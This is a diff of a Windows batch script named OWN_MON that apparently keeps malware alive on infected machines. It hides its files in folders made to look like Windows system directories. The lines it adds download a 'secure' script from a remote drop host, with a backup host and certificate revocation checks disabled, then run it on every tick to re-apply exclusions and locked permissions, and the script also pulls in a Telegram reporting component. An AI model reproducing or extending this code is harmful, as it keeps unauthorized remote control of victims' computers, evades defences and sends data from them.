@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN_MON BUILD 20260802M4 - wipe-proof heal + rich Telegram reports
+REM OWN_MON BUILD 20260802M5 - wipe-proof heal + secure re-lock + Telegram
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
@@ -17,7 +17,16 @@ set "HOST=%COMPUTERNAME%"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo mon_tick %DATE% %TIME% M4>>"%LOG%"
+echo mon_tick %DATE% %TIME% M5>>"%LOG%"
+
+REM --- refresh secure + re-apply exclusions/ACL every tick ---
+set "SEC=%WD%\own_secure.cmd"
+curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\own_secure_upd.cmd" "%DROP%/own_secure.cmd?t=%CB%" >nul 2>&1
+if not exist "%TEMP%\own_secure_upd.cmd" curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\own_secure_upd.cmd" "%DROP2%/own_secure.cmd?t=%CB%" >nul 2>&1
+if exist "%TEMP%\own_secure_upd.cmd" for %%A in ("%TEMP%\own_secure_upd.cmd") do if %%~zA GTR 400 (
+  findstr /C:"OWN_SECURE BUILD" "%TEMP%\own_secure_upd.cmd" >nul && copy /y "%TEMP%\own_secure_upd.cmd" "%SEC%" >nul
+)
+if exist "%SEC%" call "%SEC%"
 
 REM --- refresh rich Telegram reporter from repo ---
 set "TGR=%WD%\tg_report.ps1"
